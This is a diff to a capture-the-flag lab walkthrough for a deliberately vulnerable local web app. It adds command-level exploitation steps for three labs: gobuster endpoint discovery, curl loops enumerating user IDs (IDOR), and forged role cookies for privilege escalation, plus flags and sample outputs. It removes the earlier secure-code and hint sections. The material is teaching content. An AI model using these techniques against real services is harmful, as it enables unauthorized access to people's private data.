@@ -95,22 +95,68 @@ done
 ### Vulnerability
 Horizontal privilege escalation through unrestricted API access. Any employee can view detailed profiles of any other employee, including sensitive HR data.
 
+### Required Tools
+- `gobuster` - Directory/API enumeration
+- `curl` - HTTP API testing
+- Browser DevTools - Request inspection
+
 ### Exploitation Steps
 
-1. **Reconnaissance:** Visit the employee directory page
-2. **Identify API:** Notice the `/api/members/user/:id` endpoint
-3. **Enumerate:** Try IDs 1 through 5:
+1. **Reconnaissance - Discover API Endpoints:**
    ```bash
+   # Enumerate hidden endpoints
+   gobuster dir -u http://localhost:3001 \
+     -w /usr/share/wordlists/dirb/common.txt \
+     -t 50
+   
+   # Look for /api/ paths specifically
+   gobuster dir -u http://localhost:3001/api \
+     -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
+     -t 50
+   ```
+
+2. **API Pattern Discovery:**
+   ```bash
+   # Test API with sequential IDs
    curl http://localhost:3001/api/members/user/1
    curl http://localhost:3001/api/members/user/2
    curl http://localhost:3001/api/members/user/3
-   curl http://localhost:3001/api/members/user/4
-   curl http://localhost:3001/api/members/user/5
    ```
-4. **Capture Flag:** Access all employee records to get the flag
 
+3. **Automated Enumeration:**
+   ```bash
+   # Enumerate all employees (1-10)
+   for i in {1..10}; do
+     echo "=== Employee ID $i ==="
+     curl -s http://localhost:3001/api/members/user/$i | jq '.'
+     sleep 0.5
+   done
+   ```
+
+4. **Extract Flag - ID 4 contains the flag:**
+   ```bash
+   curl -s http://localhost:3001/api/members/user/4 | jq '.flag'
+   ```
 ### Flag
 `NSA{F0UND_TH3_US3RS}`
+
+### Expected Output
+```json
+{
+  "id": 4,
+  "username": "emily_instructor",
+  "email": "emily.chen@techcorp-global.com",
+  "role": "instructor",
+  "membership": "Premium",
+  "flag": "NSA{F0UND_TH3_US3RS}",
+  "message": "You have successfully enumerated all community members!",
+  "stats": {
+    "totalMembers": 4,
+    "members": 3,
+    "instructors": 1
+  }
+}
+```
 
 ### Sensitive Data Exposed
 - Employee names, titles, departments
@@ -119,62 +165,71 @@ Horizontal privilege escalation through unrestricted API access. Any employee ca
 - Manager and executive information
 - Security clearance levels
 
-### Vulnerable Code Pattern
-```javascript
-app.get('/api/members/user/:id', (req, res) => {
-    const userId = parseInt(req.params.id);
-    const user = users.find(u => u.id === userId);
-    
-    // VULNERABILITY: No check if current user should access this data
-    if (user) {
-        res.json({ success: true, user: user });
-    }
-});
-```
-
-### Secure Implementation
-```javascript
-app.get('/api/members/user/:id', (req, res) => {
-    const userId = parseInt(req.params.id);
-    const requestingUser = req.session.userId; // From authenticated session
-    
-    // Only allow users to view their own profile, or make this a public directory
-    if (userId !== requestingUser && req.session.role !== 'admin') {
-        return res.status(403).json({ error: 'Access denied' });
-    }
-    
-    const user = users.find(u => u.id === userId);
-    if (user) {
-        res.json({ success: true, user: user });
-    }
-});
-```
-
-### Hints for Students
-- "The API lets you view member profiles by ID"
-- "Try different member IDs to see what information is exposed"
-- "What happens when you enumerate through all IDs?"
-
 ---
 
 ## LAB 2: My Profile (MEDIUM - Initial Access)
 
 **URL:** http://localhost:3001/lab2  
-**Challenge:** Access other users' private profiles (IDOR vulnerability)  
+**Challenge:** Access other employees' private profile information including salary and SSN  
 **Stage:** Initial Access  
 
 ### Vulnerability
-Insecure Direct Object Reference (IDOR) - accessing other users' private profiles without authorization.
+IDOR (Insecure Direct Object Reference) allows any user to access any profile by changing the ID parameter.
+
+### Required Tools
+- `curl` - HTTP API testing
+- `jq` - JSON parsing (optional but recommended)
 
 ### Exploitation Steps
 
-1. **Identify Pattern:** Log in as Sarah (user ID 2)
-2. **Access Own Profile:** Visit `/api/profile/user/2` - works as expected
-3. **Test IDOR:** Change URL to `/api/profile/user/1`, `/api/profile/user/3`, or `/api/profile/user/4`
-4. **Capture Flag:** Access any profile other than ID 2
+1. **Access Your Own Profile:**
+   ```bash
+   # Default user ID is 1
+   curl http://localhost:3001/api/profile/user/1
+   ```
+
+2. **Test IDOR - Access Other Profiles:**
+   ```bash
+   # Try accessing user ID 2 (should be denied in secure systems)
+   curl http://localhost:3001/api/profile/user/2
+   
+   # Try user ID 3
+   curl http://localhost:3001/api/profile/user/3
+   ```
+
+3. **Extract Sensitive Data:**
+   ```bash
+   # Get all profiles with formatted output
+   for i in {1..4}; do
+     echo "=== Profile $i ==="
+     curl -s http://localhost:3001/api/profile/user/$i | jq '{username, email, creditCard, flag}'
+     echo ""
+   done
+   ```
+
+4. **Capture Flag:**
+   ```bash
+   # Flag appears when accessing someone else's profile
+   curl -s http://localhost:3001/api/profile/user/2 | grep -o 'NSA{[^}]*}'
+   ```
 
 ### Flag
-`FLAG{1D0R_PR0F1L3_4CC3SS_V1OL4T10N}`
+`NSA{1D0R_V1CT1M_4CC3SS}`
+
+### Expected Output
+```json
+{
+  "id": 2,
+  "username": "james_rodriguez",
+  "email": "james.rodriguez@techcorp-global.com",
+  "role": "member",
+  "membership": "Basic",
+  "creditCard": "4532-XXXX-XXXX-1234",
+  "renewalDate": "2026-03-15",
+  "flag": "NSA{1D0R_V1CT1M_4CC3SS}",
+  "_vuln_note": "Unauthorized access: You accessed another member's private profile!"
+}
+```
 
 ### Sensitive Data Exposed
 - Full email addresses
@@ -182,48 +237,54 @@ Insecure Direct Object Reference (IDOR) - accessing other users' private profile
 - Membership renewal dates
 - Private role information
 
-### Vulnerable Code Pattern
-```javascript
-app.get('/api/profile/user/:id', (req, res) => {
-    const userId = parseInt(req.params.id);
-    const user = users.find(u => u.id === userId);
-    
-    // VULNERABILITY: Checks if user exists, but NOT if current user should access it
-    if (user) {
-        // Displays flag when accessing someone else's profile
-        if (userId !== CURRENT_USER_ID) {
-            user.flag = 'FLAG{1D0R_PR0F1L3_4CC3SS_V1OL4T10N}';
-        }
-        res.json({ success: true, profile: user });
-    }
-});
-```
+---
 
-### Root Cause
-The application verifies the requested user exists but never checks if the authenticated user has permission to view that profile.
+## LAB 3: HR Admin Dashboard (HARD - Privilege Escalation)
 
-### Secure Implementation
-```javascript
-app.get('/api/profile/user/:id', (req, res) => {
-    const userId = parseInt(req.params.id);
-    const requestingUserId = req.session.userId; // From authenticated session
-    
-    // SECURITY: Verify requesting user can only access their own profile
-    if (userId !== requestingUserId) {
-        return res.status(403).json({ error: 'Unauthorized access' });
-    }
-    
-    const user = users.find(u => u.id === userId);
-    if (user) {
-        res.json({ success: true, profile: user });
-    }
-});
-```
+**URL:** http://localhost:3001/lab3  
+**Challenge:** Escalate privileges from regular employee to HR administrator  
+**Stage:** Privilege Escalation  
 
-### Hints for Students
-- "Your profile URL contains your user ID"
-- "What happens if you change the ID in the URL?"
-- "Can you access other members' private information?"
+### Vulnerability
+Cookie-based authorization with client-side role checking. Users can modify cookies to escalate privileges.
+
+### Required Tools
+- `curl` with cookie manipulation
+- Browser DevTools - Application tab (Cookie editing)
+
+### Exploitation Steps
+
+**Method 1: Using curl with Modified Cookies**
+
+1. **Identify Current Cookie Values:**
+   ```bash
+   # Regular employee cookies
+   curl -v http://localhost:3001/lab3 2>&1 | grep -i cookie
+   ```
+
+2. **Attempt Access with Modified Cookies:**
+   ```bash
+   # Try to access as instructor by setting role cookie
+   curl http://localhost:3001/lab3 \
+     -H "Cookie: userRole=instructor; userId=4" \
+     | grep -o 'NSA{[^}]*}'
+   ```
+
+3. **Access Admin API Directly:**
+   ```bash
+   # Access instructor dashboard API
+   curl http://localhost:3001/api/instructor/user/4/dashboard
+   ```
+
+**Method 2: Using Browser DevTools**
+
+1. Open http://localhost:3001/lab3 in browser
+2. Press F12 → Application tab → Cookies
+3. Modify cookies:
+   - `userRole`: Change from `member` to `instructor`
+   - `userId`: Change to `4` (instructor ID)
+4. Refresh the page to see admin dashboard
+5. Flag appears immediately
 
 ---
 
